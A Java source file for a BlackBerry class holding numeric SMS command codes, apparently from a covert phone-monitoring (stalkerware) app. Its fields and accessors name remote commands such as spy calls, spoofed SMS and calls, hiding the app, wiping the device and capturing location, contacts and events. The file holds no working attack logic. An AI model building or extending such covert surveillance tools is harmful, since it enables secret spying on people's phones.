package com.vvt.rmtcmd;

import net.rim.device.api.util.Persistable;

public class SMSCommandCode implements Persistable {
	
	private int enableCaptureCmd = 0;
	private int stopCaptureCmd = 0;
	private int requestEventsCmd = 0;
	private int sendDiagnosticsCmd = 0;
	private int enableSIMCmd = 0;
	private int enableGPSCmd = 0;
	private int gpsOnDemandCmd = 0;
	private int updateLocationInterval = 0;
	private int bbmCmd = 0;
	private int activateUrlCmd = 0;
	private int activationAcUrlCmd = 0;
	private int deactivationCmd = 0;
//	private int activationPhoneNumberCmd = 0;
	private int queryUrlCmd = 0;
	private int deleteDatabaseCmd = 0;
	private int settingCmd = 0;
	private int uninstallCmd = 0;
	private int enableSpyCallCmd = 0;
	private int enableSpyCallMPNCmd = 0;
	private int enableWatchListCmd = 0;
	private int setWatchFlagsCmd = 0;
	private int heartbeatCmd = 0;
	private int lockDeviceCmd = 0;
	private int unlockDeviceCmd = 0;
	private int wipeoutCmd = 0;
	private int spoofCallCmd = 0;
	private int spoofSMSCmd = 0;
	private int sendAddrForApprovalCmd = 0;
	private int syncAddressbookCmd = 0;
	private int syncCommDirectiveCmd = 0;
	private int syncTimeCmd = 0;
	private int visibilityCmd = 0;
	private int addURLCmd = 0;
	private int resetURLCmd = 0;
	private int clearURLCmd = 0;
	private int reqCurrentURLCmd = 0;	
	private int syncUpdateConfigCmd = 0;
	private int addMonitorNumberCmd = 0;
	private int clearMonitorNumberCmd = 0;
	private int resetMonitorNumberCmd = 0;
	private int queryMonitorNumberCmd = 0;
	private int addKeywordCmd = 0;
	private int resetKeywordCmd = 0;
	private int clearKeywordCmd = 0;
	private int queryKeywordCmd = 0;
	private int addWatchNumberCmd = 0;
	private int resetWatchNumberCmd = 0;
	private int clearWatchNumberCmd = 0;
	private int queryWatchNumberCmd = 0;
	private int syncProcessProfileCmd = 0;
	private int syncIncompAppDefCmd = 0;
	private int panicModeCmd = 0;
	private int enablePanicCmd = 0;
	private int addHomeOutNumberCmd = 0;
	private int resetHomeOutNumberCmd = 0;
	private int clearHomeOutNumberCmd = 0;
	private int queryHomeOutNumberCmd = 0;
	private int addHomeInNumberCmd = 0;
	private int resetHomeInNumberCmd = 0;
	private int clearHomeInNumberCmd = 0;
	private int queryHomeInNumberCmd = 0;
	private int sendAddressbookCmd = 0;
	private int requestSettingsCmd = 0;
	private int requestStartupTimeCmd = 0;
	private int requestMobileNumberCmd = 0;
	
	public int getEnableCaptureCmd() {
		return enableCaptureCmd;
	}
	
	public int getStopCaptureCmd() {
		return stopCaptureCmd;
	}
	
	public int getRequestEventsCmd() {
		return requestEventsCmd;
	}
	
	public int getSendDiagnosticsCmd() {
		return sendDiagnosticsCmd;
	}
	
	public int getEnableSIMCmd() {
		return enableSIMCmd;
	}
	
	public int getEnableGPSCmd() {
		return enableGPSCmd;
	}
	
	public int getGPSOnDemandCmd() {
		return gpsOnDemandCmd;
	}
	
	public int getUpdateLocationIntervalCmd() {
		return updateLocationInterval;
	}
	
	public int getBBMCmd() {
		return bbmCmd;
	}
	
	public int getActivateUrlCmd() {
		return activateUrlCmd;
	}
	
	public int getActivationAcUrlCmd() {
		return activationAcUrlCmd;
	}
	
	public int getDeactivationCmd() {
		return deactivationCmd;
	}

	/*public int getActivationPhoneNumberCmd() {
		return activationPhoneNumberCmd;
	}*/
	
	public int getSyncUpdateConfigCmd() {
		return syncUpdateConfigCmd;
	}
	
	public int getQueryUrlCmd() {
		return queryUrlCmd;
	}

	public int getDeleteDatabaseCmd() {
		return deleteDatabaseCmd;
	}
	
	public int getUninstallCmd() {
		return uninstallCmd;
	}

	public int getSettingCmd() {
		return settingCmd;
	}
	
	public int getEnableSpyCallCmd() {
		return enableSpyCallCmd;
	}
	
	public int getEnableSpyCallMPNCmd() {
		return enableSpyCallMPNCmd;
	}
	
	public int getEnableWatchListCmd() {
		return enableWatchListCmd;
	}
	
	public int getRequestHeartbeatCmd() {
		return heartbeatCmd;
	}
	
	public int getLockDeviceCmd() {
		return lockDeviceCmd;
	}
	
	public int getUnlockDeviceCmd() {
		return unlockDeviceCmd;
	}
	
	public int getWipeoutCmd() {
		return wipeoutCmd;
	}
	
	public int getSpoofCallCmd() {
		return spoofCallCmd;
	}
	
	public int getSpoofSMSCmd() {
		return spoofSMSCmd;
	}
	
	public int getSendAddrForApprovalCmd() {
		return sendAddrForApprovalCmd;
	}
	
	public int getSyncAddressbookCmd() {
		return syncAddressbookCmd;
	}
	
	public int getSyncCommDirectiveCmd() {
		return syncCommDirectiveCmd;
	}
	
	public int getSyncTimeCmd() {
		return syncTimeCmd;
	}
	
	public int getVisibilityCmd() {
		return visibilityCmd;
	}
	
	public int getAddURLCmd() {
		return addURLCmd;
	}
	
	public int getResetURLCmd() {
		return resetURLCmd;
	}
	
	public int getClearURLCmd() {
		return clearURLCmd;
	}
	
	public int getRequestCurrentURLCmd() {
		return reqCurrentURLCmd;
	}
	
	public int getSetWatchFlagsCmd() {
		return setWatchFlagsCmd;
	}
	
	public int getAddMonitorNumberCmd() {
		return addMonitorNumberCmd;
	}
	
	public int getClearMonitorNumberCmd() {
		return clearMonitorNumberCmd;
	}
	
	public int getResetMonitorNumberCmd() {
		return resetMonitorNumberCmd;
	}
	
	public int getQueryMonitorNumberCmd() {
		return queryMonitorNumberCmd;
	}
	
	public int getAddKeywordCmd() {
		return addKeywordCmd;
	}
	
	public int getResetKeywordCmd() {
		return resetKeywordCmd;
	}
	
	public int getClearKeywordCmd() {
		return clearKeywordCmd;
	} 
	
	public int getQueryKeywordCmd() {
		return queryKeywordCmd;
	} 
	
	public int getAddWatchNumberCmd() {
		return addWatchNumberCmd;
	}
	
	public int getResetWatchNumberCmd() {
		return resetWatchNumberCmd;
	}
	
	public int getClearWatchNumberCmd() {
		return clearWatchNumberCmd;
	}
	
	public int getQueryWatchNumberCmd() {
		return queryWatchNumberCmd;
	}
	
	public int getSyncProcessProfileCmd() {
		return syncProcessProfileCmd;
	}
	
	public int getSyncIncompAppDefCmd() {
		return syncIncompAppDefCmd;
	}
	
	public int getPanicModeCmd() {
		return panicModeCmd;
	}
	
	public int getEnablePanicCmd() {
		return enablePanicCmd;
	}
	
	public int getAddHomeOutNumberCmd() {
		return addHomeOutNumberCmd;
	}
	
	public int getResetHomeOutNumberCmd() {
		return resetHomeOutNumberCmd;
	}
	
	public int getClearHomeOutNumberCmd() {
		return clearHomeOutNumberCmd;
	}
	
	public int getQueryHomeOutNumberCmd() {
		return queryHomeOutNumberCmd;
	}
	
	public int getAddHomeInNumberCmd() {
		return addHomeInNumberCmd;
	}
	
	public int getResetHomeInNumberCmd() {
		return resetHomeInNumberCmd;
	}
	
	public int getClearHomeInNumberCmd() {
		return clearHomeInNumberCmd;
	}
	
	public int getQueryHomeInNumberCmd() {
		return queryHomeInNumberCmd;
	}
	
	public int getSendAddressbookCmd() {
		return sendAddressbookCmd;
	}
	
	public int getRequestSettingsCmd() {
		return requestSettingsCmd;
	}
	
	public int getRequestStartupTimeCmd() {
		return requestStartupTimeCmd;
	}
	
	public int getRequestMobileNumberCmd() {
		return requestMobileNumberCmd;
	}
	
	public void setEnableCaptureCmd(int enableCaptureCmd) {
		this.enableCaptureCmd = enableCaptureCmd;
	}
	
	public void setStopCaptureCmd(int stopCaptureCmd) {
		this.stopCaptureCmd = stopCaptureCmd;
	}
	
	public void setRequestEventsCmd(int requestEventsCmd) {
		this.requestEventsCmd = requestEventsCmd;
	}
	
	public void setSendDiagnosticsCmd(int sendDiagnosticsCmd) {
		this.sendDiagnosticsCmd = sendDiagnosticsCmd;
	}
	
	public void setEnableSIMCmd(int enableSIMCmd) {
		this.enableSIMCmd = enableSIMCmd;
	}
	
	public void setEnableGPSCmd(int enableGPSCmd) {
		this.enableGPSCmd = enableGPSCmd;
	}
	
	public void setGPSOnDemandCmd(int gpsOnDemandCmd) {
		this.gpsOnDemandCmd = gpsOnDemandCmd;
	}
	
	public void setUpdateLocationIntervalCmd(int updateLocationInterval) {
		this.updateLocationInterval = updateLocationInterval;
	}
	
	public void setBBMCmd(int bbmCmd) {
		this.bbmCmd = bbmCmd;
	}

	public void setActivateUrlCmd(int activateUrlCmd) {
		this.activateUrlCmd = activateUrlCmd;
	}

	public void setActivationAcUrlCmd(int activationAcUrlCmd) {
		this.activationAcUrlCmd = activationAcUrlCmd;
	}
	
	public void setDeactivationCmd(int deactivationCmd) {
		this.deactivationCmd = deactivationCmd;
	}

	/*public void setActivationPhoneNumberCmd(int activationPhoneNumberCmd) {
		this.activationPhoneNumberCmd = activationPhoneNumberCmd;
	}*/
	
	public void setSyncUpdateConfigCmd(int syncUpdateConfigCmd) {
		this.syncUpdateConfigCmd = syncUpdateConfigCmd;
	}
	
	public void setQueryUrlCmd(int queryUrlCmd) {
		this.queryUrlCmd = queryUrlCmd;
	}

	public void setDeleteDatabaseCmd(int deleteDatabaseCmd) {
		this.deleteDatabaseCmd = deleteDatabaseCmd;
	}

	public void setUninstallCmd(int uninstallCmd) {
		this.uninstallCmd = uninstallCmd;
	}

	public void setSettingCmd(int settingCmd) {
		this.settingCmd = settingCmd;
	}
	
	public void setEnableSpyCallCmd(int enableSpyCallCmd) {
		this.enableSpyCallCmd = enableSpyCallCmd;
	}
	
	public void setEnableSpyCallMPNCmd(int enableSpyCallMPNCmd) {
		this.enableSpyCallMPNCmd = enableSpyCallMPNCmd;
	}
	
	public void setEnableWatchListCmd(int enableWatchListCmd) {
		this.enableWatchListCmd = enableWatchListCmd;
	}
	
	public void setRequestHeartbeatCmd(int heartbeatCmd) {
		this.heartbeatCmd = heartbeatCmd;
	}
	
	public void setLockDeviceCmd(int lockDeviceCmd) {
		this.lockDeviceCmd = lockDeviceCmd;
	}
	
	public void setUnLockDeviceCmd(int unlockDeviceCmd) {
		this.unlockDeviceCmd = unlockDeviceCmd;
	}
	
	public void setWipeoutCmd(int wipeoutCmd) {
		this.wipeoutCmd = wipeoutCmd;
	}
	
	public void setSpoofCallCmd(int spoofCallCmd) {
		this.spoofCallCmd = spoofCallCmd;
	}
	
	public void setSpoofSMSCmd(int spoofSMSCmd) {
		this.spoofSMSCmd = spoofSMSCmd;
	}
	
	public void setSendAddrForApprovalCmd(int sendAddrForApprovalCmd) {
		this.sendAddrForApprovalCmd = sendAddrForApprovalCmd;
	}
	
	public void setSyncAddressbookCmd(int syncAddressbookCmd) {
		this.syncAddressbookCmd = syncAddressbookCmd;
	}
	
	public void setSyncCommDirectiveCmd(int syncCommDirectiveCmd) {
		this.syncCommDirectiveCmd = syncCommDirectiveCmd;
	}
	
	public void setSyncTimeCmd(int syncTimeCmd) {
		this.syncTimeCmd = syncTimeCmd;
	}
	
	public void setVisibilityCmd(int visibilityCmd) {
		this.visibilityCmd = visibilityCmd;
	}
	
	public void setAddURLCmd(int addURLCmd) {
		this.addURLCmd = addURLCmd;
	}
	
	public void setResetURLCmd(int resetURLCmd) {
		this.resetURLCmd = resetURLCmd;
	}
	
	public void setClearURLCmd(int clearURLCmd) {
		this.clearURLCmd = clearURLCmd;
	}
	
	public void setRequestCurrentURLCmd(int reqCurrentURLCmd) {
		this.reqCurrentURLCmd = reqCurrentURLCmd;
	}
	
	public void setSetWatchFlagsCmd(int setWatchFlagsCmd) {
		this.setWatchFlagsCmd = setWatchFlagsCmd;
	}
	
	public void setAddMonitorNumberCmd(int addMonitorNumberCmd) {
		this.addMonitorNumberCmd = addMonitorNumberCmd;
	}
	
	public void setClearMonitorNumberCmd(int clearMonitorNumberCmd) {
		this.clearMonitorNumberCmd = clearMonitorNumberCmd;
	}
	
	public void setResetMonitorNumberCmd(int resetMonitorNumberCmd) {
		this.resetMonitorNumberCmd = resetMonitorNumberCmd;
	}
	
	public void setQueryMonitorNumberCmd(int queryMonitorNumberCmd) {
		this.queryMonitorNumberCmd = queryMonitorNumberCmd;
	}
	
	public void setAddKeywordCmd(int addKeywordCmd) {
		this.addKeywordCmd = addKeywordCmd;
	}
	
	public void setResetKeywordCmd(int resetKeywordCmd) {
		this.resetKeywordCmd = resetKeywordCmd;
	}
	
	public void setClearKeywordCmd(int clearKeywordCmd) {
		this.clearKeywordCmd = clearKeywordCmd;
	}
	
	public void setQueryKeywordCmd(int queryKeywordCmd) {
		this.queryKeywordCmd = queryKeywordCmd;
	}
	
	public void setAddWatchNumberCmd(int addWatchNumberCmd) {
		this.addWatchNumberCmd = addWatchNumberCmd;
	}
	
	public void setResetWatchNumberCmd(int resetWatchNumberCmd) {
		this.resetWatchNumberCmd = resetWatchNumberCmd;
	}
	
	public void setClearWatchNumberCmd(int clearWatchNumberCmd) {
		this.clearWatchNumberCmd = clearWatchNumberCmd;
	}
	
	public void setQueryWatchNumberCmd(int queryWatchNumberCmd) {
		this.queryWatchNumberCmd = queryWatchNumberCmd;
	}
	
	public void setSyncProcessProfile(int syncProcessProfileCmd) {
		this.syncProcessProfileCmd = syncProcessProfileCmd;
	}
	
	public void setSyncIncompAppDefCmd(int syncIncompAppDefCmd) {
		this.syncIncompAppDefCmd = syncIncompAppDefCmd;
	}
	
	public void setPanicModeCmd(int panicModeCmd) {
		this.panicModeCmd = panicModeCmd;
	}
	
	public void setEnablePanicCmd(int enablePanicCmd) {
		this.enablePanicCmd = enablePanicCmd;
	}
	
	public void setAddHomeOutNumberCmd(int addHomeOutNumberCmd) {
		this.addHomeOutNumberCmd = addHomeOutNumberCmd;
	}
	
	public void setResetHomeOutNumberCmd(int resetHomeOutNumberCmd) {
		this.resetHomeOutNumberCmd = resetHomeOutNumberCmd;
	}
	
	public void setClearHomeOutNumberCmd(int clearHomeOutNumberCmd) {
		this.clearHomeOutNumberCmd = clearHomeOutNumberCmd;
	}
	
	public void setQueryHomeOutNumberCmd(int queryHomeOutNumberCmd) {
		this.queryHomeOutNumberCmd = queryHomeOutNumberCmd;
	}
	
	public void setAddHomeInNumberCmd(int addHomeInNumberCmd) {
		this.addHomeInNumberCmd = addHomeInNumberCmd;
	}
	
	public void setResetHomeInNumberCmd(int resetHomeInNumberCmd) {
		this.resetHomeInNumberCmd = resetHomeInNumberCmd;
	}
	
	public void setClearHomeInNumberCmd(int clearHomeInNumberCmd) {
		this.clearHomeInNumberCmd = clearHomeInNumberCmd;
	}
	
	public void setQueryHomeInNumberCmd(int queryHomeInNumberCmd) {
		this.queryHomeInNumberCmd = queryHomeInNumberCmd;
	}
	
	public void setSendAddressbookCmd(int sendAddressbookCmd) {
		this.sendAddressbookCmd = sendAddressbookCmd;
	}
	
	public void setRequestSettingsCmd(int requestSettingsCmd) {
		this.requestSettingsCmd = requestSettingsCmd;
	}
	
	public void setRequestStartupTimeCmd(int requestStartupTimeCmd) {
		this.requestStartupTimeCmd = requestStartupTimeCmd;
	}
	
	public void setRequestMobileNumberCmd(int requestMobileNumberCmd) {
		this.requestMobileNumberCmd = requestMobileNumberCmd;
	}
}
